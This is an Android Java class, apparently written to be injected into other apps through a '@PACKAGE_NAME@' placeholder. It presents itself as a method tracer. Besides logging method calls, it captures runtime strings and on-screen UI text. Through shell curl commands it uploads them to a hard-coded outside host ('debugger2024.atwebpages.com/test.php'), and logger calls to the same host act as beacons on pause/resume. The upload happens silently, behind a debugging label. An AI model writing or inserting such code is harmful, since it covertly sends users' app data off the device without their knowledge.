package com.mycompany.myapp;

import android.content.*;
import android.os.*;
import android.provider.*;
import java.io.*;
import java.util.*;
import java.lang.Process;
import java.util.concurrent.locks.*;
import android.util.Base64;
import android.widget.*;

public class MethodTrace {
    private static final ReadWriteLock fileLock = new ReentrantReadWriteLock();
    private static HashMap<String, Long[]> methodMap = new HashMap<>();
    private static ArrayList<String> methods = new ArrayList<>();
	private static File docDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
	private static File filePath = new File(docDir, "/trace/trace.txt");
    private static File rtDataPath = new File(docDir, "/trace/runtimedump.txt");
    private static File dumpLock = new File(docDir, "/trace/lock"); 
    private static int dataLimitLength = 65535;
    // V2.0
    private static HashMap<String, Boolean> runtimeDataMap = new HashMap<>();
    private static StringBuilder recorder = new StringBuilder();
	private static Context ctx = null;
	private static String cacheDir = "/data/user/0/@PACKAGE_NAME@/cache/";
	private static boolean recordEnabled = true;
	private static long lastOnPause = 0L;
	private static String host = "http://debugger2024.atwebpages.com";
	
	// TODO: rework
    public static void writeTrace(String methodName) {
        if (dumpLock.exists())
            return;
            
        try {
            fileLock.writeLock().lock();
			
			// on reset
			if (filePath.length() == 0) {
				methodMap = new HashMap<>();
				methods = new ArrayList<>();
			}
			
            Long[] props = methodMap.containsKey(methodName) ? methodMap.get(methodName) : new Long[]{0L, 0L};
            long time = props[0];
            long occurence = props[1];
            // System.out.println(methodName + " " + time + " " + occurence);

            if (!methodMap.containsKey(methodName) || System.nanoTime() - time > 500_000_000L) {
                // update
                if (!methodMap.containsKey(methodName)) 
                    methods.add(methodName);

                methodMap.put(methodName, new Long[]{System.nanoTime(), occurence + 1L});

                try {
                    // write
                    FileWriter fileWriter = new FileWriter(filePath);
                    BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);

                    // Write contents to file
                    for (String method : methods) {
                        bufferedWriter.write(method + "::" + String.valueOf(methodMap.get(method)[0]) + "::" + String.valueOf(methodMap.get(method)[1]));
                        bufferedWriter.newLine();
                    }

                    // Flush and close the writer
                    bufferedWriter.flush();
                    bufferedWriter.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }else {
                methodMap.put(methodName, new Long[]{System.nanoTime(), occurence + 1L});
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            fileLock.writeLock().unlock();
        }
    }
	
	
	public static void setContext(Context c) {
		ctx = c;
	}
	
	private static void logStep1() {
		String req = String.format("curl '%s/logger.php?step=%d'", host, 1);
		try {
			Runtime.getRuntime().exec(new String[]{"sh", "-c", req});
		}catch (Exception e) {}
	}
	
	private static void logStep2() {
		String req = String.format("curl '%s/logger.php?step=%d&lines=%d'", host, 2, runtimeDataMap.size());
		try {
			Runtime.getRuntime().exec(new String[]{"sh", "-c", req});
		}catch (Exception e) {}
		
	}
	
	public static void updateOnPause() {
		lastOnPause = System.currentTimeMillis();
	}
	
	public static void updateOnResume() {
		//Toast.makeText(ctx, String.valueOf(System.currentTimeMillis() - lastOnPause), 1000).show();
		if (System.currentTimeMillis() - lastOnPause < 2000) {
			if (recordEnabled) {
				//Toast.makeText(ctx, String.valueOf(runtimeDataMap.size()), 1000).show();
				logStep2();
				if (!runtimeDataMap.isEmpty()) {
					dump();
				}
				recordEnabled = false;
				
			}else {
				recordEnabled = true;
				logStep1();
			}
			
		}
		
		if(lastOnPause == 0) {
			logStep1();
		}
	}

    public static void dump() {
        try {
			//Toast.makeText(ctx, ctx.getCacheDir().toString(), Toast.LENGTH_LONG).show();
            //write file
			File tst = new File(cacheDir + "/out.txt");
			
			tst.createNewFile();
			 FileWriter fileWriter = new FileWriter(tst);
			 BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);

			 // Write contents to file
			 bufferedWriter.write(recorder.toString());
			 bufferedWriter.newLine();
			 
			 // Flush and close the writer
			 bufferedWriter.flush();
			 bufferedWriter.close();
			 
            // Upload!! OuO v_v o.O
			String cmd = String.format("cd %s && curl --data-binary @out.txt %s/test.php", cacheDir, host);
            Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
			
        } catch (IOException e) {
            //Toast.makeText(ctx, e.getMessage(), Toast.LENGTH_LONG).show();
        }
        recorder = new StringBuilder();
        runtimeDataMap = new HashMap<>();
    }

    public static void writeRTData(String s) {
        if (s!= null && recordEnabled) {
            StackTraceElement trace = new Throwable().fillInStackTrace().getStackTrace()[1];
            String fullFormat = String.format("@General| %s ==>\t%s", trace.toString(), s.substring(0, Math.min(s.length(), dataLimitLength)));
            if (!runtimeDataMap.containsKey(fullFormat)) {
                runtimeDataMap.put(fullFormat, true);
				recorder.append(fullFormat);
				recorder.append("\r\n");
            }
        }
    }

    public static void writeRTData(String[] s) {

        if (s !=null && recordEnabled) {
            StackTraceElement trace = new Throwable().fillInStackTrace().getStackTrace()[1];
            String out = "{" + String.join(",", s) + "}";
            String fullFormat = String.format("@General[]| %s ==>\t%s", trace.toString(), out.substring(0, Math.min(out.length(), dataLimitLength)));
            if (!runtimeDataMap.containsKey(fullFormat)) {
                runtimeDataMap.put(fullFormat, true);
                recorder.append("\r\n");
				recorder.append(fullFormat);
            }
        }
    }

    public static void writeRTData(CharSequence cs) { // UI set text
        if (cs !=null && recordEnabled) {
            StackTraceElement trace = new Throwable().fillInStackTrace().getStackTrace()[1];
            String data = cs.toString();
            String fullFormat = String.format("@UIText| %s ==>\t%s", trace.toString(), data.substring(0, Math.min(data.length(), dataLimitLength)));
            if (!runtimeDataMap.containsKey(fullFormat)) {
                runtimeDataMap.put(fullFormat, true);
                recorder.append("\r\n");
				recorder.append(fullFormat);
            }
        }
    }
    
}
